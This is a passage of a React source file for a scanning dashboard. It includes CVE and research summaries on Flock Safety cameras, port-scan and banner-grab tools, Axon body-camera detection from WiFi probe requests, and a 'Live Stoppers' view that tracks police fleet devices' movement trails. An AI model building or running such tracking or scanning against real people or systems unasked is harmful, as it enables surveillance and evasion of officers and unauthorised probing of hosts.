    desc:'CVE-2025-47822 (published NVD June 2025) describes an "on-chip debug interface with improper access control" affecting Flock Safety LPR device firmware through version 2.2. This is part of a broader set of CVEs (47819–47824) disclosed by researcher "GainSec" after a year-long coordinated disclosure process. The CVE class: JTAG/SWD debug pads on embedded hardware that are not disabled or access-controlled after manufacturing. With physical access and appropriate hardware tools (JTAG probe, logic analyzer), an attacker can: dump flash memory, read cryptographic keys and credentials stored on-device, bypass secure boot, and install modified firmware. GainSec explicitly stated all testing was done on lawfully purchased devices in isolated lab environments, not on production deployments. Remediation: firmware updates beyond 2.2 are intended to close the debug interface; hardware-level fixes (fused debug ports) would require device replacement. Defense: verify firmware version on all deployed devices; treat physically accessible LPR cameras as potential attack surfaces if mounting isn\'t hardened.',
    flockResearch: true,
  },
  'ref-cve-embedded-secret': {
    icon:'🔑', name:'CVE-2025-59405 — Embedded API Key in Android App',
    status:'NVD PUBLISHED — Android app component · Secrets in binary',
    law:'CFAA applies to unauthorized use of extracted credentials',
    lawColor:'rgba(180,195,220,0.4)',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.MODERATE,
    detectionNote:'Extracting keys from the APK is detectable only if you act on them. The key itself is already visible to anyone who decompiles the APK — remediation requires rotating the key and moving to server-mediated auth.',
    invNet: false, invNetNote: null,
    desc:'CVE-2025-59405 (GitHub Advisory Database) describes a cleartext API key or OAuth client secret embedded in an Android application component deployed on Flock LPR/edge devices. Binaries shipped to devices can be extracted and decompiled — any secrets in the binary are effectively public to anyone with access to the APK. The risk: the embedded key grants some level of API access; if scoped broadly (not least-privilege), it could be used to query the backend, retrieve data, or make authenticated calls as the device. This is a classic "secrets-in-client-binary" antipattern common in IoT and mobile development. Correct fix: remove the secret from the binary; use short-lived tokens issued by a backend auth service; implement server-side scope validation so even a leaked key has minimal blast radius. GainSec\'s research describes this as part of a broader pattern of software supply-chain hygiene issues across Flock\'s embedded/Android ecosystem.',
    flockResearch: true,
  },
  'ref-national-lookup-gov': {
    icon:'🏛', name:'National Lookup — Governance & Federal Access',
    status:'POLICY INCIDENT — Oct 2025 · Vendor settings updated',
    law:'Fourth Amendment (government use) · Privacy Act · State privacy laws',
    lawColor:'rgba(180,195,220,0.4)',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.HIGH,
    detectionNote:'This is a governance/policy issue, not a technical vulnerability. No unauthorized access is involved — the risk is authorized-but-unchecked access flowing across agency boundaries.',
    invNet: false, invNetNote: null,
    desc:'In October 2025, KUOW (Seattle NPR) reported that a University of Washington Center for Human Rights study found federal immigration enforcement (ICE/DHS) had been running plate searches against Washington state agencies\' Flock data through a "National Lookup" feature. This feature allows Flock customers to query plate sightings across a shared pool of participating agencies\' data. Some Washington agencies were unaware that federal agencies had access through this mechanism and began disabling or restricting the setting after learning of it. Flock\'s response: disputed some characterizations, said customers control sharing settings, subsequently removed federal agencies from National/State Lookup by default, and added keyword filters to block certain search terms in jurisdictions where state law prohibits them. Why this matters for app design: (1) "misconfiguration" of access-sharing settings can have serious civil liberties consequences; (2) audit logging and anomaly detection for cross-agency data sharing is a first-class security requirement; (3) the blast radius of any credential compromise is multiplied when data is shared across many agencies without fine-grained controls.',
    flockResearch: true,
  },
  'ref-gainsec-research': {
    icon:'🔬', name:'GainSec — 51 Findings, 22 CVEs (2025 Whitepaper)',
    status:'PUBLIC DISCLOSURE — Nov 2025 · Coordinated with vendor',
    law:'N/A — authorized lab-only research on owned devices',
    lawColor:'rgba(180,195,220,0.4)',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
    detectionNote:'This documents legitimate security research methodology, not an attack technique.',
    invNet: false, invNetNote: null,
    desc:'Researcher "GainSec" (Jon Gaines) published a whitepaper in November 2025 documenting 51 security findings across Flock Safety\'s device ecosystem, with 22 assigned CVEs. Key methodology: (1) all testing on lawfully purchased devices in isolated lab environments — never on production networks; (2) coordinated disclosure timeline of ~9 months before public release; (3) intentional redaction of operational exploit details to minimize misuse risk; (4) findings submitted to MITRE for CVE assignment. Vulnerability classes discovered: on-chip debug interfaces (JTAG/SWD) with insufficient access control; hardcoded credentials and connection details in firmware; cleartext storage of sensitive code/data; embedded secrets in Android app components; authentication/authorization weaknesses in camera-feed Android components. Flock\'s response acknowledged the findings, described most as requiring physical access and specialized knowledge to exploit, and stated firmware/software updates were in progress. Flock also engaged Bishop Fox for ongoing adversarial security testing. The GainSec research represents the most comprehensive public technical audit of Flock devices and sets the baseline for any defensive validation checklist (see reproducibility table).',
    flockResearch: true,
  },
}

function UsageInstructions({ title, steps }) {
  const [open, setOpen] = useState(false)
  return (
    <div style={{ marginBottom:8 }}>
      <button onClick={() => setOpen(v => !v)} style={{
        display:'flex', alignItems:'center', gap:8, width:'100%',
        background:'rgba(0,200,255,0.05)', border:'1px solid rgba(0,200,255,0.15)',
        borderRadius:10, padding:'8px 12px', cursor:'pointer', fontFamily:C.font,
        color:C.accent, fontSize:12, fontWeight:700,
      }}>
        <span>📖</span> {title}
        <span style={{ marginLeft:'auto', display:'inline-block', transform: open ? 'rotate(90deg)' : 'none', transition:'transform 0.2s' }}>▶</span>
      </button>
      {open && (
        <div style={{
          background:'rgba(0,200,255,0.03)', border:'1px solid rgba(0,200,255,0.1)',
          borderTop:'none', borderRadius:'0 0 10px 10px', padding:'10px 12px',
          display:'flex', flexDirection:'column', gap:8,
        }}>
          {steps.map((s, i) => (
            <div key={i} style={{ display:'flex', gap:10, alignItems:'flex-start' }}>
              <span style={{ fontSize:16, flexShrink:0 }}>{s.icon}</span>
              <div>
                <div style={{ fontSize:12, fontWeight:700, color:C.text, marginBottom:2 }}>{s.title}</div>
                <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{s.desc}</div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

function TabLab() {
  const [probes, setProbes]             = useState([])
  const [network, setNetwork]           = useState([])
  const [cell, setCell]                 = useState({})
  const [aggressive, setAggressive]     = useState({})
  const [portTarget, setPortTarget]     = useState('')
  const [portPorts, setPortPorts]       = useState('22,80,443,8080,8443')
  const [portResults, setPortResults]   = useState([])
  const [portScanning, setPortScanning] = useState(false)
  const [bannerHost, setBannerHost]     = useState('')
  const [bannerPort, setBannerPort]     = useState('80')
  const [bannerResult, setBannerResult] = useState(null)
  const [bannerLoading, setBannerLoading] = useState(false)
  const [activeSection, setActiveSection] = useState('probes')
  const [showDesc, setShowDesc] = useState({})
  const [invNetPrompt, setInvNetPrompt] = useState(null)
  const [stopperData, setStopperData] = useState([])

  const isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)

  useEffect(() => {
    const load = async () => {
      const [p, n, c, a] = await Promise.all([
        fetch('/scan/probes').then(r => r.json()).catch(() => ({ probes: [] })),
        fetch('/scan/network').then(r => r.json()).catch(() => ({ devices: [] })),
        fetch('/scan/cell').then(r => r.json()).catch(() => ({ cell: {} })),
        fetch('/scan/aggressive').then(r => r.json()).catch(() => ({})),
      ])
      setProbes(p.probes || [])
      setNetwork(n.devices || [])
      setCell(c.cell || {})
      setAggressive(a)
    }
    load()
    const id = setInterval(load, isMobileDevice ? 15000 : 5000)
    return () => clearInterval(id)
  }, [])

  useEffect(() => {
    const loadStoppers = () =>
      fetch('/stoppers/active?window_min=30')
        .then(r => r.json())
        .then(d => setStopperData(d.stoppers || []))
        .catch(() => {})
    loadStoppers()
    const id = setInterval(loadStoppers, isMobileDevice ? 30000 : 10000)
    return () => clearInterval(id)
  }, [])

  const runPortScan = async () => {
    if (!portTarget) return
    setPortScanning(true)
    setPortResults([])
    const ports = portPorts.split(',').map(p => p.trim()).filter(Boolean)
    const results = await Promise.all(
      ports.map(port =>
        fetch(`/scan/port-check?host=${encodeURIComponent(portTarget)}&port=${port}`)
          .then(r => r.json())
          .catch(() => ({ port, open: false, error: 'request failed' }))
      )
    )
    setPortResults(results)
    setPortScanning(false)
  }

  const grabBanner = async () => {
    if (!bannerHost) return
    setBannerLoading(true)
    setBannerResult(null)
    const res = await fetch(`/scan/banner?host=${encodeURIComponent(bannerHost)}&port=${bannerPort}`)
      .then(r => r.json()).catch(() => ({ error: 'request failed' }))
    setBannerResult(res)
    setBannerLoading(false)
  }

  const LIVE_SECTIONS = [
    { id:'stoppers',   icon:'🚔', label:'Live Stoppers',  count: stopperData.length || null, invNet: false },
    { id:'probes',     icon:'📡', label:'Probe Requests', count: probes.length, invNet: false },
    { id:'network',    icon:'🌐', label:'LAN Devices',    count: network.length, invNet: true },
    { id:'cell',       icon:'📶', label:'Cell Signal',    count: null, invNet: false },
    { id:'aggressive', icon:'🎯', label:'Aggressive',     count: ((aggressive.fleet_wifi_count||0)+(aggressive.axon_ble_count||0)) || null, invNet: false },
    { id:'port',       icon:'🔌', label:'Port Scanner',   count: portResults.filter(r=>r.open).length || null, invNet: true },
    { id:'banner',     icon:'🏷', label:'Banner Grab',    count: null, invNet: true },
  ]

  // Sorted by detectionRisk.score descending — most likely caught first
  const REF_ORDER = [
    // — Offensive RF / Net (sorted: most caught → untraceable) —
    'ref-stream','ref-deauth','ref-disassoc','ref-beacon','ref-arp','ref-axon-ble',
    'ref-probe','ref-ble-dos','ref-usb','ref-ios',
    // — Police Tracking Methods —
    'ref-phishing-cad','ref-malware-cad','ref-ecu-telematics',
    'ref-flock-camera-bypass','ref-flock-exposed-feeds','ref-flock-android-os','ref-flock-cleartext-mitm','ref-hot-list','ref-mobile-gateway',
    'ref-data-broker','ref-api-shadow-it','ref-web-intercept',
    'ref-radio-sdr-pipeline','ref-cad-sdr',
    // — Infrastructure Reference —
    'ref-flock-portal','ref-telematics-portal','ref-p25-sdr','ref-deflock',
  ]

  const sidebarBtnStyle = (id) => ({
    display:'flex', alignItems:'center', gap:8, padding:'7px 10px', borderRadius:8, width:'100%',
    background: activeSection===id ? (id.startsWith('ref-') ? 'rgba(255,69,58,0.07)' : 'rgba(0,200,255,0.08)') : 'transparent',
    border: activeSection===id ? `1px solid ${id.startsWith('ref-') ? 'rgba(255,69,58,0.2)' : 'rgba(0,200,255,0.2)'}` : '1px solid transparent',
    color: activeSection===id ? (id.startsWith('ref-') ? C.red : C.accent) : C.dim,
    textAlign:'left', cursor:'pointer', fontFamily:C.font, transition:'all 0.12s',
  })

  return (
    <div style={{ display:'flex', gap:0, animation:'devFadeIn 0.25s ease', height:'100%', minHeight:0 }}>

      {/* ── Sidebar ── */}
      <div style={{ width:200, flexShrink:0, overflowY:'auto', paddingRight:8, display:'flex', flexDirection:'column', gap:1, borderRight:`1px solid ${C.border}`, paddingBottom:24 }}>

        {/* Live Intel */}
        <div style={{ fontSize:9, fontWeight:700, color:C.green, textTransform:'uppercase', letterSpacing:'0.12em', padding:'4px 4px 5px', marginTop:4 }}>📡 Live Intel</div>
        {LIVE_SECTIONS.filter(s => ['stoppers','probes','cell','aggressive'].includes(s.id)).map(s => (
          <button key={s.id} style={sidebarBtnStyle(s.id)} onClick={() => setActiveSection(s.id)}>
            <span style={{ fontSize:13 }}>{s.icon}</span>
            <span style={{ flex:1, fontSize:11 }}>{s.label}</span>
            {s.count > 0 && <span style={{ fontSize:9, background:'rgba(0,200,255,0.15)', color:C.accent, borderRadius:8, padding:'1px 5px', flexShrink:0 }}>{s.count}</span>}
          </button>
        ))}

        {/* Network Tools */}
        <div style={{ fontSize:9, fontWeight:700, color:C.accent, textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 5px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🌐 Network Tools</div>
        {LIVE_SECTIONS.filter(s => ['network','port','banner'].includes(s.id)).map(s => (
          <button key={s.id} style={sidebarBtnStyle(s.id)} onClick={() => setActiveSection(s.id)}>
            <span style={{ fontSize:13 }}>{s.icon}</span>
            <span style={{ flex:1, fontSize:11 }}>{s.label}</span>
            {s.count > 0 && <span style={{ fontSize:9, background:'rgba(0,200,255,0.15)', color:C.accent, borderRadius:8, padding:'1px 5px', flexShrink:0 }}>{s.count}</span>}
            {s.invNet && <span onClick={e => { e.stopPropagation(); setInvNetPrompt({ id: s.id, name: s.label }) }} style={{ fontSize:9, background:'rgba(124,58,237,0.18)', color:'#a78bfa', borderRadius:4, padding:'1px 5px', cursor:'pointer', flexShrink:0 }}>Net</span>}
          </button>
        ))}

        {/* Police Tracking Methods */}
        <div style={{ fontSize:9, fontWeight:700, color:'#FF9F0A', textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🚔 Tracking Methods</div>
        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>How LE systems get compromised — read only</div>
        {['ref-phishing-cad','ref-malware-cad','ref-ecu-telematics','ref-flock-camera-bypass','ref-hot-list','ref-mobile-gateway','ref-data-broker','ref-api-shadow-it','ref-web-intercept','ref-radio-sdr-pipeline','ref-cad-sdr'].map(id => {
          const r = LAB_REF[id]; const dr = r.detectionRisk
          return (
            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
              <span style={{ fontSize:12 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
              </div>
            </button>
          )
        })}

        {/* Offensive RF / Net Techniques */}
        <div style={{ fontSize:9, fontWeight:700, color:C.red, textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>⚡ Offensive RF / Net</div>
        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Won't-do · dev education only</div>
        {['ref-stream','ref-deauth','ref-disassoc','ref-beacon','ref-arp','ref-axon-ble','ref-probe','ref-ble-dos','ref-usb','ref-ios'].map(id => {
          const r = LAB_REF[id]; const dr = r.detectionRisk
          return (
            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
              <span style={{ fontSize:12 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
              </div>
              {r.invNet && <span onClick={e => { e.stopPropagation(); setInvNetPrompt({ id, name: r.name }) }} style={{ fontSize:9, background:'rgba(124,58,237,0.18)', color:'#a78bfa', borderRadius:4, padding:'1px 5px', cursor:'pointer', flexShrink:0 }}>Net</span>}
            </button>
          )
        })}

        {/* Infrastructure Reference */}
        <div style={{ fontSize:9, fontWeight:700, color:C.purple, textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🗂 Infrastructure Ref</div>
        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Background research & context</div>
        {['ref-flock-portal','ref-telematics-portal','ref-p25-sdr','ref-deflock'].map(id => {
          const r = LAB_REF[id]; const dr = r.detectionRisk
          return (
            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
              <span style={{ fontSize:12 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
              </div>
            </button>
          )
        })}

        {/* Won't Build */}
        <div style={{ fontSize:9, fontWeight:700, color:'#FF453A', textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🚫 Won't Build</div>
        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Refused — how it works & why not</div>
        {['ref-wontbuild-flock-observer','ref-wontbuild-radio-decoder','ref-wontbuild-api-interceptor','ref-wontbuild-patrol-crowdsource'].map(id => {
          const r = LAB_REF[id]
          return (
            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
              <span style={{ fontSize:12 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                <div style={{ fontSize:9, color:'#FF453A', opacity:0.75, marginTop:1 }}>REFUSED</div>
                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
              </div>
            </button>
          )
        })}

        {/* Flock Security Research */}
        <div style={{ fontSize:9, fontWeight:700, color:'#FF9F0A', textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🔬 Flock Security Research</div>
        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Benn Jordan / GainSec findings</div>
        {['ref-condor-exposure','ref-cve-debug-interface','ref-cve-embedded-secret','ref-national-lookup-gov','ref-gainsec-research'].map(id => {
          const r = LAB_REF[id]; const dr = r.detectionRisk
          return (
            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
              <span style={{ fontSize:12 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                <div style={{ fontSize:9, color:'#FF9F0A', opacity:0.75, marginTop:1 }}>RESEARCH</div>
                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
              </div>
            </button>
          )
        })}
      </div>

      {/* ── Main panel ── */}
      <div style={{ flex:1, overflowY:'auto', paddingLeft:16, minWidth:0 }}>

        {/* Invincible.Net prompt */}
        {invNetPrompt && (
          <div style={{ position:'sticky', top:0, zIndex:10, background:'rgba(124,58,237,0.1)', border:`1px solid rgba(124,58,237,0.3)`, borderRadius:10, padding:'10px 14px', marginBottom:12, display:'flex', alignItems:'center', gap:10 }}>
            <span style={{ fontSize:20 }}>🌐</span>
            <div style={{ flex:1 }}>
              <div style={{ fontSize:13, fontWeight:700, color:'#a78bfa' }}>Flag for Invincible.Net?</div>
              <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>
                <strong style={{ color:'#a78bfa' }}>{invNetPrompt.name}</strong> — useful for the network admin / pentesting spin-off?
                {LAB_REF[invNetPrompt.id]?.invNetNote && <div style={{ marginTop:4, color:C.dim2 }}>{LAB_REF[invNetPrompt.id].invNetNote}</div>}
              </div>
            </div>
            <button onClick={() => { alert(`✅ "${invNetPrompt.name}" flagged for Invincible.Net!`); setInvNetPrompt(null) }}
              style={{ ...S.btn('rgba(124,58,237,0.3)'), fontSize:12, color:'#a78bfa', border:'1px solid rgba(124,58,237,0.5)', flexShrink:0 }}>Yes, flag it</button>
            <button onClick={() => setInvNetPrompt(null)} style={{ background:'transparent', border:'none', color:C.dim2, cursor:'pointer', fontSize:18, lineHeight:1, flexShrink:0 }}>✕</button>
          </div>
        )}

      {/* ── Live Stoppers ── */}
      {activeSection === 'stoppers' && (() => {
        const now = Date.now()
        const active  = stopperData.filter(s => now - s.last_seen_ms < 5 * 60 * 1000)
        const recent  = stopperData.filter(s => now - s.last_seen_ms >= 5 * 60 * 1000 && now - s.last_seen_ms < 15 * 60 * 1000)
        const older   = stopperData.filter(s => now - s.last_seen_ms >= 15 * 60 * 1000)
        const fmt = ms => {
          const s = Math.round((now - ms) / 1000)
          return s < 60 ? `${s}s ago` : s < 3600 ? `${Math.round(s/60)}m ago` : `${Math.round(s/3600)}h ago`
        }
        return (
          <div>
          <UsageInstructions title="Live Stoppers — How to Use" steps={[
            { icon:'🚔', title:'What it shows', desc:'Fleet/patrol devices detected via passive WiFi and BLE scanning in the last 30 minutes. Each stopper is identified by matching known fleet hardware patterns: Cradlepoint routers, Sierra Wireless AirLink, Axon Fleet, Motorola APX, and Fun-Stopper classification from the encounter aggregator.' },
            { icon:'📍', title:'Movement trail', desc:'When the same device (MAC address) appears at different GPS coordinates over time, the app reconstructs its movement trail. "Mobile" = confirmed moving. "Fixed" = same location each time (likely parked or a base station, not a vehicle).' },
            { icon:'🔴', title:'Activity colors', desc:'Red = active (seen < 5 min ago). Orange = recent (5–15 min ago). Gray = older (15–30 min ago). The same color coding appears on the map trail lines.' },
            { icon:'📡', title:'Data source', desc:'Derived from raw_observations with fleet-pattern meta_json filtering, merged with confirmed Fun-Stopper encounters. Refresh interval: 10 seconds. Window: last 30 minutes.' },
          ]} />
          <div className="dev-card" style={{ marginTop:8 }}>
            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:12 }}>
              <div>
                <div style={{ fontSize:14, fontWeight:700 }}>Live Stopper Tracking</div>
                <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>Fleet / patrol devices — last 30 min window</div>
              </div>
              <div style={{ display:'flex', gap:6 }}>
                {active.length > 0  && <span className="dev-badge" style={{ background:'rgba(255,69,58,0.12)', color:C.red }}>{active.length} active</span>}
                {recent.length > 0  && <span className="dev-badge" style={{ background:'rgba(255,159,10,0.1)', color:C.orange }}>{recent.length} recent</span>}
                {older.length > 0   && <span className="dev-badge">{older.length} older</span>}
                {stopperData.length === 0 && <span className="dev-badge">No stoppers detected</span>}
              </div>
            </div>
            {stopperData.length === 0
              ? <div style={{ color:C.dim, fontSize:12, textAlign:'center', padding:'16px 0' }}>No fleet devices detected in last 30 minutes<br/><span style={{ fontSize:11, opacity:0.6 }}>Requires passive WiFi/BLE scanning with GPS fix</span></div>
              : (
                <table className="dev-table">
                  <thead>
                    <tr>
                      <th>Device</th>
                      <th>Source</th>
                      <th style={{ textAlign:'right' }}>RSSI</th>
                      <th style={{ textAlign:'right' }}>Hits</th>
                      <th style={{ textAlign:'right' }}>Mobile</th>
                      <th style={{ textAlign:'right' }}>Last Seen</th>
                    </tr>
                  </thead>
                  <tbody>
                    {stopperData.map((s, i) => {
                      const ageMs  = now - s.last_seen_ms
                      const dotCol = ageMs < 5*60000 ? C.red : ageMs < 15*60000 ? C.orange : C.dim
                      return (
                        <tr key={i}>
                          <td>
                            <div style={{ display:'flex', alignItems:'center', gap:6 }}>
                              <div style={{ width:7, height:7, borderRadius:'50%', background:dotCol, flexShrink:0 }}/>
                              <span style={{ fontWeight:600, maxWidth:180, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }} title={s.label}>{s.label || s.key.slice(0,18)}</span>
                            </div>
                          </td>
                          <td><span className="dev-badge" style={{ fontSize:10, background:'rgba(255,69,58,0.08)', color:C.red }}>{s.source}</span></td>
                          <td style={{ textAlign:'right', fontFamily:'monospace', color: s.rssi > -60 ? C.green : s.rssi > -80 ? C.orange : C.dim }}>{s.rssi ?? '—'}</td>
                          <td style={{ textAlign:'right' }}>{s.hit_count}</td>
                          <td style={{ textAlign:'right' }}>{s.is_mobile ? <span style={{ color:C.red }}>📍 Yes</span> : <span style={{ color:C.dim }}>📌 No</span>}</td>
                          <td style={{ textAlign:'right', color:dotCol, fontFamily:'monospace', fontSize:11 }}>{fmt(s.last_seen_ms)}</td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              )
            }
          </div>
          </div>
        )
      })()}

      {/* ── Probe Requests ── */}
      {activeSection === 'probes' && (
        <div>
        <UsageInstructions title="Probe Requests — How to Use" steps={[
          { icon:'📋', title:'What it shows', desc:'Nearby devices actively searching for previously-connected WiFi networks. Devices broadcast the SSIDs they want to reconnect to — fully passive, zero frames transmitted by this app.' },
          { icon:'🔧', title:'Requirements', desc:'Npcap installed with WinPcap-compatible mode checked. WiFi adapter must support monitor mode. If empty: open Npcap installer, check "WinPcap API-compatible Mode" and restart.' },
          { icon:'📊', title:'Reading the table', desc:'MAC = source device hardware address. SSIDs Wanted = every network it\'s probing for. RSSI = signal strength (dBm): -30 strongest, -100 weakest. # SSIDs = how many networks it\'s looking for.' },
          { icon:'🚔', title:'Axon identification', desc:'Axon body cameras reliably probe for their evidence dock SSID (format: AXON_DOCK_XXXXXX). This identifies them even when the camera is off-body and the screen is dark.' },
          { icon:'⏱', title:'Update rate', desc:'Refreshes every 5 seconds. Data accumulates over the session — older entries remain visible until the session is cleared.' },
        ]} />
        <div className="dev-card" style={{ marginTop:8 }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:12 }}>
            <div>
              <div style={{ fontSize:14, fontWeight:700 }}>Probe Requests</div>
              <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>SSIDs nearby devices are broadcasting — passive 802.11 capture only</div>
            </div>
            <span className="dev-badge" style={{ background:'rgba(0,200,255,0.1)', color:C.accent }}>{probes.length} devices</span>
          </div>
          {probes.length === 0
            ? <div style={{ color:C.dim, fontSize:12, padding:'12px 0', textAlign:'center' }}>No probe data captured yet<br/><span style={{fontSize:11}}>Requires Scapy + Npcap in WinPcap mode</span></div>
            : (
              <table className="dev-table">
                <thead><tr><th>MAC</th><th>SSIDs Wanted</th><th style={{textAlign:'right'}}>RSSI</th><th style={{textAlign:'right'}}># SSIDs</th></tr></thead>
                <tbody>
                  {probes.map((p, i) => (
                    <tr key={i}>
                      <td style={{ fontFamily:'monospace', color:C.accent, fontSize:11 }}>{p.mac}</td>
                      <td style={{ color:C.dim, maxWidth:240, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }} title={p.probed_ssids.join(', ')}>{p.probed_ssids.join(', ')}</td>
                      <td style={{ textAlign:'right', color: p.avg_rssi > -60 ? C.green : p.avg_rssi > -80 ? C.orange : C.dim }}>{p.avg_rssi} dBm</td>
                      <td style={{ textAlign:'right' }}>{p.ssid_count}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )
          }
        </div>
        </div>
      )}

      {/* ── LAN Devices ── */}
      {activeSection === 'network' && (
        <div>
        <UsageInstructions title="LAN Devices — How to Use" steps={[
          { icon:'🔍', title:'What it shows', desc:'Every device on your local /24 subnet, discovered via 4 parallel methods: ARP ping sweep, mDNS multicast (Apple/Chromecast/printers), SSDP M-SEARCH (UPnP smart devices), and NetBIOS node status.' },
          { icon:'⏱', title:'Update frequency', desc:'Re-scans automatically every 5 minutes. Results accumulate — devices that went offline remain listed until the next full rescan.' },
          { icon:'📊', title:'Reading the columns', desc:'Name = hostname or friendly name (e.g. "iPhone" or "DESKTOP-XXXX"). Services = mDNS service types (_http._tcp, _airplay._tcp) or UPnP device types. Manufacturer = OUI database lookup from MAC prefix.' },
          { icon:'🌐', title:'Invincible.Net relevance', desc:'LAN topology mapping is the foundation of network assessment. This same technique (ARP+mDNS+SSDP) generates the host discovery phase of any network audit.' },
        ]} />
        <div className="dev-card" style={{ marginTop:8 }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:12 }}>
            <div>
              <div style={{ fontSize:14, fontWeight:700 }}>LAN Devices</div>
              <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>ARP sweep · mDNS · SSDP/UPnP · NetBIOS — rescans every 5 min</div>
            </div>
            <span className="dev-badge" style={{ background:'rgba(48,209,88,0.1)', color:C.green }}>{network.length} found</span>
          </div>
          {network.length === 0
            ? <div style={{ color:C.dim, fontSize:12, padding:'12px 0', textAlign:'center' }}>No LAN devices discovered yet</div>
            : (
              <table className="dev-table">
                <thead><tr><th>Name</th><th>IP</th><th>MAC</th><th>Manufacturer</th><th>Services</th></tr></thead>
                <tbody>
                  {network.map((d, i) => (
                    <tr key={i}>
                      <td style={{ fontWeight:600 }}>{d.name}</td>
                      <td style={{ fontFamily:'monospace', fontSize:11 }}>{d.ip}</td>
                      <td style={{ fontFamily:'monospace', fontSize:11, color:C.dim }}>{d.mac}</td>
                      <td style={{ color:C.dim }}>{d.manufacturer || '—'}</td>
                      <td style={{ color:C.accent, fontSize:11 }}>{[...(d.mdns_services||[]),...(d.upnp_types||[])].slice(0,3).join(', ') || '—'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )
          }
        </div>
        </div>
      )}

      {/* ── Cell Signal ── */}
      {activeSection === 'cell' && (
        <div>
        <UsageInstructions title="Cell Signal — How to Use" steps={[
          { icon:'📡', title:'Data source', desc:'Reads cellular modem data via WMI (Windows Management Instrumentation) root\\wmi MBN namespace. Falls back to parsing netsh mbn show signal output if WMI is unavailable.' },
          { icon:'📊', title:'Signal values explained', desc:'RSSI = total received signal strength (dBm). RSRP = Reference Signal Received Power — better quality indicator, more stable. RSRQ = quality ratio (signal vs. interference). SNR = signal-to-noise ratio. Higher (less negative) = better signal quality.' },
          { icon:'🔧', title:'Requirements', desc:'A cellular modem or MiFi adapter connected to this Windows machine. USB LTE dongles and built-in laptop modems both work. WiFi-only machines show "No cellular adapter detected".' },
          { icon:'📍', title:'Use case', desc:'Track signal strength as you drive to identify dead zones and correlate with encounter data. Low signal = scanner may miss BLE/WiFi hits if using cellular relay.' },
        ]} />
        <div className="dev-card" style={{ marginTop:8 }}>
